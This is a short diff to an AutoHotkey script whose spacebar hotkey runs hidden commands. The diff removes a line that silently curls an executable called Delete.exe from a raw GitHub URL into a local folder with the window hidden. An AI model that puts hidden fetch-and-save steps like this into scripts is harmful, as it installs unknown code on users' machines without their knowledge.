@@ -1,4 +1,4 @@
-#SingleInstance Ignore
+#SingleInstance Force
 
 ^Esc::ExitApp
 
@@ -28,7 +28,5 @@ $Space::{
             RunWait command, , "Hide"
             Run path "\" letter ".ahk"
         }
-        command := "cmd /c curl https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/Delete.exe > " path "\Delete.exe"
-        RunWait command, , "Hide"
     }
 }
